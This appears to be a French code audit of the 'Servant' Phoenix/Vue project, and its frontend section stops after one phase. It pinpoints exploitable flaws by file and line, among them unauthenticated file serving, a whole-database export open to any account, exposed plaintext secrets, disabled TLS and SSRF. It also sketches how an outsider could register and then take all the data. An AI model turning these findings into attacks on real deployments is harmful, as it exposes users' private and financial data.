# Audit de code — Servant

**Date :** 2026-06-22
**Périmètre :** dépôt complet `servant` (backend Phoenix/Elixir + frontend Vue 3 SPA)

> Audit en lecture seule. Aucune modification du code source. Ce fichier est le livrable.
> Exécuté en 8 phases × 2 passes (Backend puis Frontend), suivi d'une synthèse transversale.

---

# 🎯 Synthèse transversale

### Résumé exécutif

Servant est un projet **bien architecturé et au code propre** : arbre de supervision OTP soigné, système de connecteurs extensible (behaviour + macro EVM), entries universelles, frontend Vue typé en `strict`. La qualité d'écriture est au-dessus de la moyenne. **Mais** deux fonctionnalités annoncées comme acquises sont en réalité défaillantes, et l'isolation multi-utilisateur — pourtant le cœur de la promesse — est trouée en plusieurs endroits :

1. **Le temps réel est entièrement cassé** — trois causes indépendantes (UUID passé à `String.to_integer`, noms d'événements front/back divergents, `auth.user` non réhydraté). Annoncé dans le README, non fonctionnel en pratique.
2. **L'isolation multi-utilisateur est compromise** — `/files/` sert les fichiers de tous sans authentification (y compris des relevés bancaires importés), `/export/database` laisse n'importe quel compte télécharger toute la base (hash de mots de passe + secrets en clair), et l'API renvoie les secrets de connecteurs.
3. **L'absence quasi totale de tests sur les chemins critiques** (auth, scoping, web, canal) explique que ces régressions soient passées inaperçues.

Thèmes récurrents : *contrat front↔back non testé et divergent*, *secrets mal protégés*, *curseurs de synchro non persistés*, *XSS structurelle des « apps » impératives côté front*.

### Top priorités (à traiter en premier)

| # | Sévérité | Constat | Où | Pourquoi |
|---|---|---|---|---|
| 1 | 🔴 | `/files/` servi **sans authentification** ni contrôle de propriété | `endpoint.ex:34`, `plugs/files_static.ex` | Fuite de fichiers privés d'autres utilisateurs (photos, **relevés bancaires**) |
| 2 | 🔴 | `/export/database` exporte **toute la base multi-utilisateur** | `export_controller.ex:130` | Tout compte aspire hash de mots de passe + secrets de tous |
| 3 | 🔴 | Canal temps réel mort (UUID→int, événements, `auth.user`) | `data_channel.ex:6`, `useSocket.ts:40`, `auth.ts:7` | Fonctionnalité phare non opérationnelle |
| 4 | 🟠 | Secrets connecteurs en clair **et renvoyés par l'API** | `connector_config.ex:14`, `connector_controller.ex:169` | Tokens/mots de passe exposés (DB + réponses JSON) |
| 5 | 🟠 | Zéro test sur scoping `Data`, auth, contrôleurs, canal, `Storage` | `test/` | Les régressions de sécurité/contrat passent inaperçues |
| 6 | 🟠 | `System.cmd(:timeout)` inexistant → worker peut bloquer à l'infini | `invoice_scraper_connector.ex:96` | Blocage durable d'un connecteur |
| 7 | 🟠 | XSS : schéma d'`href` non validé + **aucune CSP** + token en `localStorage` | `contacts/index.ts:396`, SPA | XSS stocké → vol de token |
| 8 | 🟠 | `vite` 8.0.0 — 2 advisories **HIGH** (dev server) | `frontend/package.json` | Lecture de fichier arbitraire en dev ; `npm audit fix` |
| 9 | 🟠 | `verify: :verify_none` désactive TLS pour **tous** les connecteurs | `http.ex:21` | MITM possible (dont OAuth Strava) |
| 10 | 🟠 | Curseurs de sync non persistés + insert/broadcast par entry | `evm/solana/strava`, `worker.ex:78` | Re-scan complet au redémarrage + contention/flood |

### Quick wins (effort faible, valeur élevée)

- **`npm audit fix`** côté frontend (corrige vite HIGH + postcss) — 1 commande.
- **Masquer les secrets dans `config_json/1`** (`connector_controller.ex:163`) — ne plus renvoyer `config` en clair.
- **Corriger `DataChannel`** : retirer `String.to_integer`, comparer les chaînes (1 ligne) — déjà 1/3 du temps réel.
- **Documenter `FILES_DIR`/`TMP_DIR`** dans README/systemd — évite la perte de fichiers au redéploiement.
- **Index** `create index(:connector_configs, [:user_id])`.
- **Mises à jour patch** alignées : `phoenix 1.8.5→1.8.8` (back + front), `vue 3.5.38`.
- **Corriger la fuite d'écouteur** `keydown` (`contacts/index.ts:137`).
- **Renommer `BaseConnector`** (chaîne Base) ; `formats: [:json]` (`servant_web.ex:40`).
- **Remplacer le README frontend** boilerplate.

> ⚠️ *Limites de confiance :* la suite de tests Elixir n'a pas pu être exécutée dans l'environnement d'audit (`vix`/libvips ne compile pas — bug TLS OTP 27) ; l'analyse de couverture et de bugs backend est **statique**. Les constats `npm audit`/`hex.outdated` sont exécutés. Les sévérités sécurité supposent un déploiement **multi-utilisateur** (la promesse du README) ; en mono-utilisateur strict, plusieurs retombent d'un cran.

---

## Phase 0 — Périmètre

- **Backend** : Phoenix 1.8 API-only (Elixir ~1.18), Ecto + SQLite3, Bandit. ~6 000 LOC, 63 fichiers `.ex`.
  - Domaines : `accounts`, `connectors` (cœur du projet — ~20 connecteurs GenServer), `data` (entries universelles), `settings`, `media` (exif/thumbnails), `storage`.
  - Web : contrôleurs JSON + Phoenix Channels (`DataChannel`), auth par `Phoenix.Token` bearer.
  - 14 fichiers de test (couverture concentrée sur les parsers de connecteurs).
- **Frontend** : Vue 3.5 + Vite 8 + Pinia + vue-router, TypeScript. ~9 000 LOC, 33 fichiers.
  - Architecture « apps » (calendar, contacts, files, photos) via une registry, composables (`useApi`, `useSocket`, `useFetchData`), store `auth`.
- **Dépendances notables** : `req` (HTTP), `vix` (images/libvips), `nimble_csv`, `saxy` (XML), `exif_parser`, `bcrypt_elixir`, `date_time_parser` absent (à vérifier).
- **Conventions** : `AGENTS.md` (règles Elixir/Phoenix strictes), `mix precommit`, format API-only sans HTML/LiveView.

---

# PASSE BACKEND (Phoenix / Elixir)

## Phase 1 — Architecture

### Carte des modules (à réutiliser dans les phases suivantes)

```
Application (arbre de supervision)
  ├─ Repo (Ecto/SQLite) ─ Migrator ─ PubSub ─ Telemetry
  ├─ Registry {user_id, config_id}  ─ DynamicSupervisor (Workers)
  ├─ Scheduler (démarre les connecteurs activés au boot, +1s)
  └─ Endpoint → Router

Domaine Connectors  (cœur du projet)
  Connector (behaviour + macro __using__)  ← EVMConnector (macro) ← {Ethereum,Arbitrum,Base,HyperEVM}
  Worker (GenServer par user+config, planifie sync)   Connectors (contexte: CRUD, lifecycle, sync_logs, env cache, import fichier)
  ~12 types : rss, solana, hyperevm, arbitrum, base, ethereum, bank_csv, ical, vcard, apple_health, invoice_scraper, strava

Domaine Data    Entry (conteneur universel) + Data (contexte user-scoped, filtres, pagination, broadcast PubSub)
Domaine Accounts  User + auth bcrypt
Media  Exif / Thumbnail        Storage  (layout disque files/ + tmp/)
Web  Router (/api + fallback SPA) · Controllers (auth, entry, connector, upload, export, app, spa) · DataChannel · plug FilesStatic · plug Auth
```

**Flux clés :** (1) sync connecteur : `Scheduler/Worker` → `module.sync/1` → `Data.create_entry` → broadcast `data:<user_id>` → `DataChannel` → SPA. (2) import fichier : `ConnectorController.import_file` → `Connectors.import_file` → parser → entries. (3) upload : `UploadController` → `Storage.store_app_file` → exif/thumbnail.

### Constats

- **`connectors/base_connector.ex` — nommage trompeur** *(low)*. `BaseConnector` est le connecteur de la chaîne **Base** (Coinbase L2), mais le nom suggère un connecteur « de base »/abstrait (comme `connector.ex` ou `EVMConnector`). Confusion forte pour un nouveau venu. *Fix :* renommer en `BaseChainConnector` ou documenter clairement.

- **Curseur de synchro non persisté (EVM/blockchain)** — `evm_connector.ex:66`, `worker.ex:85` *(medium)*. `last_block` vit uniquement dans l'état mémoire du `Worker` ; il n'est jamais réécrit dans `connector_config.config`. À chaque redémarrage du worker (crash, déploiement, reboot), `init/2` repart de `Map.get(config, "last_block", 0)` → re-scan complet de la chaîne depuis le bloc 0. Pas de perte de données (contrainte d'unicité), mais charge réseau/CPU inutile et risque de rate-limit explorer. *Fix :* persister `last_block` (et curseurs analogues Solana/Strava) dans la config après chaque sync réussie.

- **Contexte `Connectors` surchargé** — `connectors.ex` (301 lignes) *(low)*. Mélange CRUD config + cycle de vie worker + sync logs + cache `ConnectorEnvironment` + import fichier. Lisible aujourd'hui mais candidat à découpage (`Connectors.Lifecycle`, `Connectors.Imports`, `Connectors.Env`).

- **Duplication des clauses de filtre atome/chaîne** — `data.ex:128-168` *(low/medium)*. `apply_filters/2` répète 8 clauses identiques (`:kind`/`"kind"`, `:from`/`"from"`…). *Fix :* normaliser les clés une fois (`stringify_keys`) puis une seule série de clauses — réduit la surface de bug (un filtre ajouté côté string seulement passerait inaperçu).

- **Sérialisation JSON dispersée dans les contrôleurs** — `connector_controller.ex:163`, `auth_controller.ex`, `entry_controller.ex`, `export_controller.ex` *(medium, couture front↔back)*. Chaque contrôleur reconstruit à la main la forme JSON (`config_json/1`, maps inline). Aucune couche de vue/serializer centralisée → risque de dérive avec `frontend/src/types.ts`. *Fix :* extraire des modules JSON (`*JSON`) ou des fonctions de sérialisation partagées, source unique de vérité du contrat d'API.

- **Boot Scheduler temporisé en dur (1 s)** — `scheduler.ex:17` *(low)*. `Process.send_after(self(), :start_connectors, 1_000)` suppose que migrations/Repo sont prêts en 1 s. Fragile au démarrage chargé. *Fix :* déclencher après confirmation Repo (ou `handle_continue`).

- **Bonne factorisation EVM** *(positif)*. La macro `EVMConnector` (ethereum/arbitrum/base + variante hyperevm) est un bon exemple de réutilisation. Solana/HyperEVM isolent correctement `rpc`/`transaction_parser`. Le behaviour `Connector` + `config_value` (avec `to_existing_atom` protégé) est sain.


## Phase 2 — Bugs / correctness

- **🔴 CRITIQUE — Realtime cassé (1) : `String.to_integer` sur un UUID** — `data_channel.ex:6`. Les IDs utilisateur sont des `binary_id` (UUID, cf. `user.ex:5`, `entry.ex:5`). `join("data:" <> user_id_str)` fait `String.to_integer(user_id_str)` → lève `ArgumentError` à **chaque** tentative de join du canal. Le join échoue systématiquement → aucune mise à jour temps réel n'est livrée. *Fix :* supprimer la conversion, comparer directement les chaînes : `if socket.assigns.user_id == user_id_str`.

- **🔴 CRITIQUE — Realtime cassé (2) : noms d'événements front/back divergents** — `data_channel.ex:18-29` vs `useSocket.ts:40`. Le backend `push`e `"entry_created"`, `"entry_updated"`, `"entry_deleted"` (charge = l'entry à plat) ; le frontend écoute un unique `"entry_change"` avec `payload.entry`. Même si le join était réparé, aucun callback ne se déclencherait. *Fix :* aligner les noms d'événements **et** la forme du payload des deux côtés (contrat unique). Aucun test ne couvre le canal → régression invisible.

- **🟠 `System.cmd` : option `:timeout` inexistante** — `invoice_scraper_connector.ex:96`. `System.cmd/3` ne supporte pas `:timeout` (options valides : `:into`, `:cd`, `:env`, `:stderr_to_stdout`, …). `@cmd_timeout` (90 s) est donc **silencieusement ignoré** : un script Playwright bloqué fait blocher indéfiniment le `Worker` GenServer. *Fix :* envelopper dans une `Task` + `Task.yield/2` + `Task.shutdown/2`, ou utiliser un `Port` avec timeout explicite.

- **🟠 RSS : `occurred_at` = maintenant pour tous les articles** — `rss_connector.ex:41`. Chaque item reçoit `DateTime.utc_now()` au lieu de la date de publication (`pubDate`/`dc:date`). Tous les articles d'un même sync ont le même horodatage → tri chronologique faux, et un re-sync (avec lien identique) garde l'`external_id` mais l'ordre reste incorrect. *Fix :* parser `pubDate`.

- **🟡 RSS utilise `:httpc` (interdit par AGENTS.md)** — `rss_connector.ex:58`. Le projet impose `Req` et fournit déjà `Servant.HTTP`. Ici on utilise `:httpc` (pas de timeout cohérent, pas de gestion TLS partagée). *Fix :* passer à `Req`/`Servant.HTTP` comme les autres connecteurs.

- **🟡 `Process.sleep` dans le `Worker` (Solana)** — `solana_connector.ex:80,140`. La synchro Solana dort 1 s par transaction (`@tx_fetch_delay_ms`) + 0,5 s par page, **dans le process GenServer** (appelé depuis `handle_info`/`handle_cast`). Jusqu'à ~1000 s de blocage : la mailbox du worker est gelée (un `sync_now` concurrent attend). *Fix :* throttling hors du GenServer (Task dédiée) ou file de jobs ; à défaut, documenter et borner.

- **🟡 Curseur de synchro non persisté (généralisé)** — `solana_connector.ex:103`, `evm_connector.ex:108`, `strava_connector.ex`. `last_signature` / `last_block` / token Strava (en cache env, lui OK) ne sont jamais réécrits dans `connector_config.config`. Redémarrage = re-scan complet. *(cf. Phase 1)*. *Fix :* après sync OK, `update_connector_config` avec le nouveau curseur.

- **🟡 Identifiants en clair sur la ligne de commande** — `invoice_scraper_connector.ex:78-92`. `email`/`password`/`totp_secret` sont passés en arguments à `System.cmd("node", …)` → visibles dans `ps aux`/`/proc` pour tout process local. *(repris en Phase 4 Sécurité).* *Fix :* passer via stdin ou variables d'environnement (`env:` de `System.cmd`).

- **⚪ `external_id` potentiellement nil → doublons** — `rss_connector.ex:39` (`item.link || item.title`), `entry.ex:25`. La contrainte d'unicité `[:user_id, :source, :external_id]` ne protège pas quand `external_id` est `NULL` (en SQLite, les NULL sont distincts). Articles sans lien ni titre → doublons à chaque sync. *Fix :* hash de contenu en repli, ou rejeter les items sans identifiant.

- **⚪ `backfill_missing` charge toutes les photos de tous les utilisateurs en mémoire** — `thumbnail.ex:74-80`. Pas de scope user ni de pagination. Acceptable pour un usage perso mono-utilisateur, mais ne passe pas à l'échelle. *Fix :* streamer par lots (`Repo.stream` dans une transaction).


## Phase 3 — Tests & couverture

> ⚠️ La suite n'a pas pu être exécutée dans l'environnement d'audit : `vix` (libvips) ne compile pas (bug TLS OTP 27 `key_usage_mismatch` au téléchargement du binaire précompilé — le même que `Servant.HTTP` documente). Analyse de couverture **statique** (cartographie fichiers de test ↔ modules). Aucun outil de couverture (`excoveralls`) configuré.

**Ce qui est testé (13 fichiers, ~1280 lignes) :** uniquement les **parsers de connecteurs** — bank_csv, ical, vcard, apple_health (+xml), solana/hyperevm transaction parsers, invoice_scraper, thumbnail, error_json. C'est du bon travail unitaire sur le parsing.

**Trous de couverture sur les chemins critiques :**

- **🟠 Aucun test sur l'isolation par utilisateur (`Data`)** — `data.ex` non testé. C'est l'invariant de sécurité central du projet (« no way to access another user's data »). Un test devrait prouver que `list_entries/get_entry!/update/delete` d'un user A ne voient jamais les entries de B. *Sans test, une régression de scoping = fuite de données silencieuse.*

- **🟠 Aucun test d'authentification / autorisation** — `auth.ex` (plug Bearer), `auth_controller.ex`, `accounts.ex` non testés. Login, expiration token, rejet sans token, mauvais mot de passe (`Bcrypt.no_user_verify`) : non couverts.

- **🟠 Aucun test des contrôleurs web** — entry, connector, upload, export, app, spa : 0 test. Les régressions d'API (statuts, formes JSON, validations) passent inaperçues.

- **🔴 Le canal temps réel n'est pas testé** — `data_channel.ex` / `user_socket.ex` : 0 test. C'est précisément pourquoi les **deux bugs critiques de la Phase 2** (UUID→integer, noms d'événements) n'ont jamais été détectés. Un simple `ChannelCase` aurait planté au join.

- **🟠 `Storage` non testé** — la sûreté des chemins (`path_safe?`, `resolve_public_path`, résolution legacy) n'est pas couverte. C'est de la logique sécurité (traversée de répertoire) : à tester en priorité.

- **🟡 `Connectors.import_file` (lifecycle d'import) non testé** au niveau contexte — seuls les parsers le sont. Le chemin sync_log + stockage + comptage d'insertions n'est pas vérifié.

- **🟡 `Worker` / `Scheduler` non testés** — planification, gestion d'erreur de sync, transitions d'état : non couverts.

**Qualité des tests existants :** corrects et ciblés (parsing). Vérifier tout de même qu'aucun ne dépend du réseau réel (les tests connecteurs Solana/HyperEVM/invoice_scraper doivent mocker les appels HTTP/`System.cmd`, sinon ils sont flaky/non exécutables hors ligne).


## Phase 4 — Sécurité

> Le projet est multi-utilisateur (tout est censé être scoping par `user_id`). Les sévérités ci-dessous sont données dans cette optique ; en déploiement strictement mono-utilisateur, certaines retombent.

- **🔴 CRITIQUE — `/files/` servi sans authentification (Broken Access Control / IDOR)** — `endpoint.ex:34`, `plugs/files_static.ex`. Le plug `FilesStatic` s'exécute **avant le routeur et avant le plug `Auth`**. `resolve_public_path/1` sert n'importe quel fichier sous `FILES_DIR` avec pour seul garde-fou un test anti-`..`. Aucune vérification de propriété : qui connaît/devine un chemin `/files/{user_id}/apps/photos/{uuid}.jpg` télécharge le fichier d'autrui — **photos privées, avatars, et surtout les fichiers d'import connecteurs archivés (`connectors/bank_csv/.../relevé.csv`, soit des relevés bancaires)**. Les UUID limitent l'énumération mais les URLs fuient (historique navigateur, logs, en-tête `Referer`, partage). *Fix :* servir les fichiers via un contrôleur authentifié qui vérifie `entry.user_id == current_user.id` (ou URLs signées à durée limitée).

- **🔴 CRITIQUE — `/export/database` exporte toute la base multi-utilisateur** — `export_controller.ex:130-148`. `GET /api/export/database` renvoie le **fichier SQLite entier** (`send_file(db_path)`). N'importe quel utilisateur authentifié récupère ainsi **les données de tous les utilisateurs** : entries, `hashed_password` de tous les comptes, et tous les secrets de connecteurs en clair (voir ci-dessous). Violation majeure d'isolation. *Fix :* supprimer cet endpoint, ou le réserver à un rôle admin, ou n'exporter que les données de l'utilisateur courant (vers un dump filtré, pas le fichier brut).

- **🟠 Secrets de connecteurs stockés en clair** — `connector_config.ex:14` (`config :map`). Les `client_secret`, `refresh_token`, `password` (invoice scraper), `totp_secret` sont écrits en clair dans `connector_configs.config` (JSON SQLite). Le schéma `Credential` (`data :binary`, `credential.ex`) suggérait un stockage chiffré… mais il est **inutilisé** (les connecteurs lisent `config.config` directement). Combiné aux deux points 🔴, l'exposition est totale. *Fix :* chiffrer les champs sensibles (Cloak/`Ecto` encrypted type), ne jamais les renvoyer dans `config_json/1` (actuellement `connector_controller.ex:169` renvoie `config:` complet, secrets inclus, à l'API !).

- **🟠 `config_json/1` renvoie les secrets à l'API** — `connector_controller.ex:163-176`. `GET /api/connectors` et `/connectors/:id` renvoient `config:` en entier (donc mots de passe/tokens) dans la réponse JSON. *Fix :* masquer/omettre les champs sensibles côté sérialisation.

- **🟠 TLS désactivé globalement pour toutes les requêtes connecteurs** — `http.ex:21` (`verify: :verify_none`). Contourne un vrai bug OTP 27, mais s'applique à **tous** les appels : endpoint OAuth Strava (échange de tokens !), explorers blockchain, scrapers. Un MITM peut voler des tokens/altérer des données financières. *Fix :* limiter `verify_none` aux hôtes précis qui déclenchent le bug (liste blanche) et garder la vérification ailleurs ; ou fournir un bundle CA correct.

- **🟠 Identifiants passés en arguments CLI** — `invoice_scraper_connector.ex:78-92`. `email`/`password`/`totp_secret` visibles dans `ps`/`/proc` pour tout process local. *Fix :* stdin ou `env:` de `System.cmd`.

- **🟡 SSRF via URLs de connecteurs** — `rss_connector.ex`, `ical_connector.ex` (`config.url`/`config.feed_url`). Le serveur récupère des URLs fournies par l'utilisateur, sans liste blanche ni blocage des IP privées/métadonnées cloud (`169.254.169.254`, `localhost`). En multi-utilisateur, un compte peut sonder le réseau interne. *Fix :* valider le schéma (http/https), résoudre et rejeter les IP privées/loopback.

- **🟡 Test anti-traversée faible** — `storage.ex:184` `path_safe?` se limite à `not String.contains?(relative, "..")`. Suffisant après `URI.decode`, mais fragile (pas de normalisation `Path.expand` + vérification de préfixe). *Fix :* `Path.expand` puis vérifier que le chemin résolu reste sous `files_root()`.

- **🟡 Pas de limitation de débit ni d'inscription restreinte** — `auth_controller.ex` (`register`/`login`). Inscription ouverte à tous + aucune limite de tentatives. Bcrypt ralentit le brute-force (et `no_user_verify` évite l'oracle de timing — bon point), mais combiné au point `/export/database`, un inconnu peut s'inscrire puis tout aspirer. *Fix :* désactiver/whitelister l'inscription pour un hub perso ; throttling sur `login`.

- **⚪ Salts/clé en dur (dev uniquement)** — `dev.exs:23`, `endpoint.ex:11`, `config.exs:23`. `secret_key_base` dev et `signing_salt` committés. La prod lit bien `SECRET_KEY_BASE` via env (`runtime.exs`) — OK. Sévérité faible (dev only). *Fix :* rien d'urgent ; éviter de committer le `secret_key_base` dev.

- **Points positifs** : scoping `user_id` systématique dans les contextes `Data`/`Connectors` (sauf l'export DB) ; auth par `Phoenix.Token` (30 j) ; bcrypt + `no_user_verify` ; pas d'injection SQL (tout passe par Ecto paramétré) ; LiveDashboard limité à `dev_routes`.


## Phase 5 — Performance

- **🟠 Insertions une-par-une + broadcast par entry pendant la synchro** — `worker.ex:78`, `connectors.ex:208-211`. Chaque sync fait `Enum.each(entries, &Data.create_entry/2)` → 1 transaction SQLite **et** 1 broadcast PubSub **par entry**. Un connecteur qui ramène l'historique (blockchain, Apple Health = potentiellement des milliers d'échantillons) génère des milliers d'INSERT individuels et inonde le canal temps réel. SQLite étant mono-écrivain, plusieurs workers amplifient la contention d'écriture. *Fix :* `Repo.insert_all` par lots avec `on_conflict: :nothing` (la contrainte d'unicité gère les doublons) ; un seul broadcast agrégé (ex. `{:entries_created, count}`) ou throttling.

- **🟠 Strava re-télécharge tout l'historique à chaque sync** — `strava_connector.ex:137-153`. `fetch_all_activities` part toujours de la page 1 sans paramètre `after` basé sur la dernière synchro. Toutes les heures, ré-pagination complète de l'historique → coûteux et risque de rate-limit (429 déjà géré, mais évitable). *Fix :* mémoriser `after` (timestamp de la dernière activité) et le persister dans la config.

- **🟡 Re-scan complet au redémarrage (curseurs non persistés)** — Solana/EVM repartent du bloc/sig 0 (cf. Phases 1-2). Impact perf direct : re-fetch massif côté explorer/RPC après chaque déploiement. *Fix :* persister le curseur.

- **🟡 Génération de miniature synchrone dans la requête d'upload** — `upload_controller.ex:53,128`, `thumbnail.ex` (libvips). Le thumbnail est généré pendant la requête HTTP ; sur une grosse image, la réponse d'upload est retardée d'autant. *Fix :* générer en tâche asynchrone (`Task.Supervisor`) et pousser le `thumb_path` via le canal une fois prêt.

- **⚪ Index manquant sur `connector_configs`** — migrations : pas d'index sur `connector_configs(user_id)` ni `(enabled)`. `list_connector_configs/1` (where user_id) et `start_all_enabled/0` (where enabled) font des scans. Volumétrie faible → impact négligeable, mais trivial à corriger. *Fix :* `create index(:connector_configs, [:user_id])`.

- **Points positifs** : très bons index sur `entries` — `[user_id, kind]`, `[user_id, source]`, `[user_id, occurred_at]`, unique `[user_id, source, external_id]` — qui couvrent exactement les filtres, le tri et la pagination de `Data.list_entries`. Pagination par `limit/offset` correcte. Solana borne ses pages (`@max_pages`) et son back-off d'erreurs.


## Phase 6 — Clean code

> Le backend est globalement **propre, idiomatique et bien documenté** (moduledocs clairs, `with`, pattern matching, fonctions courtes). Les remarques sont mineures.

- **🟡 Sérialisation `entry_json`/`config_json` dupliquée 3×** — `entry_controller.ex:90`, `data_channel.ex:32`, `export_controller.ex:10`. La même forme JSON d'entry est redéfinie à trois endroits (et diverge déjà : le canal omet `inserted_at`/`updated_at`). *Fix :* une fonction unique (ex. `Servant.Data.Entry.to_json/1` ou un module `EntryJSON`).

- **🟡 Accès config incohérent : `Map.get` vs `config_value`** — `strava_connector.ex:35-37`, `invoice_scraper_connector.ex:34-36` lisent `Map.get(config, "client_id")` (clé chaîne uniquement), alors que RSS/EVM/iCal/Solana utilisent `config_value/2-3` (chaîne **et** atome). Un config à clés atomes (tests, appels internes) ferait échouer l'`init` de Strava/invoice_scraper silencieusement. *Fix :* utiliser `config_value` partout.

- **⚪ Helpers dupliqués** — `strip_bom/1` défini dans `connectors.ex:198` **et** `bank_csv/parser.ex:198` ; `parse_int/2` dans `data.ex:195` **et** `entry_controller.ex:107`. *Fix :* factoriser dans un module utilitaire partagé.

- **⚪ `controller` déclare `formats: [:html, :json]`** — `servant_web.ex:40`. App API-only (AGENTS.md : pas de HTML). Le format `:html` et l'`use Gettext` sont superflus. *Fix :* `formats: [:json]`.

- **⚪ `AppController` : liste d'apps codée en dur** — `app_controller.ex:5-38`. Acceptable, mais la même liste existe probablement côté front (`apps/registry.ts`) → duplication de la source de vérité. *Fix :* dériver d'une config partagée si la liste grandit.

- **⚪ `format_units` en flottant pour des montants crypto** — `tx_format.ex:44`. Division flottante (wei/18 décimales) → perte de précision possible à l'affichage (le montant brut reste stocké). *Fix :* arithmétique entière/`Decimal` pour le rendu si la précision compte.

- **Points positifs** : `TxFormat`, `Connector` (behaviour + macro), `Storage` (moduledoc qui décrit le layout disque) et les parsers sont exemplaires de lisibilité. Pas de sur-ingénierie ; abstractions justifiées (macro EVM, behaviour connecteur).


## Phase 7 — Dépendances

> `mix hex.outdated` exécuté (malgré les alertes TLS OTP 27). Aucune version connue-vulnérable signalée. Pas d'outil de scan CVE (`mix_audit`) configuré.

**Mises à jour disponibles (toutes mineures, non urgentes) :**

| Dépendance | Actuelle | Dernière | Note |
|---|---|---|---|
| phoenix | 1.8.5 | 1.8.8 | correctifs patch — à prendre |
| bandit | 1.10.3 | 1.12.0 | serveur HTTP — à prendre |
| ecto_sqlite3 | 0.22.0 | 0.24.1 | 2 versions de retard |
| req | 0.5.17 | 0.6.2 | bump mineur (revoir le `~> 0.5`) |
| jason / castore | 1.4.4 / 1.0.18 | 1.4.5 / 1.0.19 | patch |
| ecto_sql | 3.13.5 | 3.14.0 | bloqué par contrainte `~> 3.13` |

**Constats :**

- **🟡 Pas de scan de vulnérabilités automatisé** — ajouter `mix_audit` (deps `:dev/:test`) et l'intégrer à `mix precommit` pour détecter les advisories Hex. *Fix :* `{:mix_audit, "~> 2.1", only: [:dev, :test], runtime: false}` + ajout à l'alias `precommit`.

- **🟡 `:inets`/`:httpc` requis uniquement à cause du connecteur RSS** — `mix.exs:23`, `rss_connector.ex:58`. Migrer RSS vers `Req` (cf. Phase 2) permettrait de retirer `:inets` de `extra_applications` (surface réduite, cohérence avec la règle « Req partout » d'AGENTS.md).

- **⚪ Hygiène de pinning correcte** — toutes les deps épinglées en `~>`, `mix.lock` présent et committé. `precommit` lance `deps.unlock --unused`. RAS de ce côté.

- **⚪ Dépendances peu/pas utilisées à confirmer** — `dns_cluster` (clustering, sans objet en self-host mono-nœud), `gettext` (quasi inutilisé : pas de traductions, app API-only). Inoffensives mais retirables si on vise la minceur. `date_time_parser` (autorisé par AGENTS.md) n'est **pas** utilisé — le parsing de dates est fait à la main partout ; l'ajouter simplifierait ces parsers.


## Phase 8 — Documentation

> Documentation de **bonne qualité** dans l'ensemble : `README.md` (déploiement, env vars, systemd, reverse-proxy), `CLAUDE.md`/`AGENTS.md`/`DEVELOPMENT.md` (conventions, archi, setup), moduledocs soignés. Les problèmes sont surtout de la **dérive doc↔code**.

- **🟠 `FILES_DIR`/`TMP_DIR`/`UPLOADS_DIR` non documentés** — `storage.ex:14-20`, `README.md` (tableau env). Le stockage des fichiers/photos repose sur ces variables ; non définies, tout atterrit dans `priv/files` (à l'intérieur de la release → **perdu à chaque redéploiement**). Lacune de déploiement à fort impact. *Fix :* documenter ces variables (optionnelles mais fortement recommandées) dans le README et l'unit systemd.

- **🟠 « Real-time » annoncé comme fonctionnel** — `README.md:10` (« Phoenix Channels push entry changes to connected clients »). Or le canal est **cassé** (Phase 2). La doc décrit une fonctionnalité non opérationnelle. *Fix :* réparer le canal (prioritaire) ou retirer l'affirmation en attendant.

- **🟠 Garanties de confidentialité multi-utilisateur surévaluées** — `README.md:9` (« each with their own private data »). Les failles `/files/` et `/export/database` (Phase 4) contredisent cette promesse. *Fix :* corriger le code (prioritaire) ; sinon documenter clairement la limite.

- **🟡 « email » listé comme source, sans connecteur email** — `README.md:3`. Aucun connecteur email/IMAP/Gmail dans `@connector_modules`. *Fix :* retirer « email » ou marquer « à venir ».

- **🟡 Contradiction Node.js runtime** — `README.md:18` (« Node.js … build-time only, not needed at runtime ») vs `invoice_scraper_connector.ex` qui exécute `node` + Playwright **à l'exécution**. *Fix :* préciser que le connecteur Invoice Collector requiert Node.js + `npm install` dans `priv/scrapers/` au runtime.

- **⚪ `docs/PLAN.md` / `docs/ai-agents-plan.md` historiques** — bien balisés comme tels dans CLAUDE.md (« historical », « not yet implemented »). RAS, juste à garder à jour.

- **Points positifs** : env vars de prod requises clairement tabulées, exemple systemd + Caddy complets, `DEVELOPMENT.md` avec setup asdf et arborescence. Le contrat d'API n'est en revanche documenté nulle part (pas d'OpenAPI ni de doc des endpoints) — acceptable pour un projet perso, mais ce serait le prochain ajout utile.


---

# PASSE FRONTEND (Vue 3 SPA)

## Phase 1 — Architecture

### Carte

```
main.ts → App.vue (layout + sidebar)  → router (vue-router, guards auth/guest)
Stores (Pinia)  auth (token localStorage, login/register)
Composables  useApi (fetch+Bearer+401) · useSocket (Phoenix Channel) · useFetchData (loading/error) · useConfirm
Vues SFC (réactives)  Login, Register, Dashboard, DataBrowser, Connectors, ConnectorDetail, Settings, Contact/PhotoDetail, AppView
« Apps » impératives (DOM manuel)  apps/{contacts,calendar,files,photos}/index.ts  montées par AppView via createAppContext
Composants  MediaViewer, ConfirmModal, KindIcon
```

### Constats

- **🟠 Deux paradigmes de rendu coexistent** — `views/*.vue` (Vue réactif, SFC) **vs** `apps/{contacts,calendar,files,photos}/index.ts` (DOM impératif : `el.innerHTML = …` + `addEventListener` + ré-render manuel). Les 4 apps (~2500 LOC) réimplémentent à la main le rendu, la délégation d'événements et la gestion d'état que Vue fournit déjà. *Conséquences :* surface de bug accrue (XSS via concat HTML — cf. Phase 4 ; fuites d'écouteurs ; perte de focus/scroll à chaque ré-render, contournée manuellement, ex. `contacts/index.ts:290` re-focus de la recherche), coût de maintenance élevé, incohérence avec le reste. *Fix :* à terme, réécrire les apps en composants Vue (réactivité, `v-for`, échappement automatique des templates). Le contrat `AppContext`/`AppModule` peut être conservé mais rendu en Vue.

- **🟠 `auth.user` non réhydraté au rechargement** — `auth.ts:7` (`user = ref(null)`), `main.ts` / `App.vue` n'appellent pas `/auth/me` au démarrage. Après un refresh : `token` est restauré depuis `localStorage` → `isAuthenticated = true`, mais `user` reste `null`. Effets : `useSocket.connect()` (`useSocket.ts:19`) sort immédiatement car `!auth.user` → **le temps réel ne se connecte jamais après un rechargement** (3e cause, en plus des 2 bugs backend) ; tout composant lisant `auth.user.xxx` voit `null`. *Fix :* au boot, si `token` présent, charger `/auth/me` et peupler `user` (ou persister `user` aussi).

- **🟡 Trois implémentations du client HTTP** — `composables/useApi.ts`, `apps/createContext.ts` (`apiFetch`/`apiJson`), `stores/auth.ts` (fetch brut login/register). Logique dupliquée (en-tête Bearer, gestion 401, parse d'erreur). *Fix :* un seul client partagé (ex. `useApi`) réutilisé par les apps et le store.

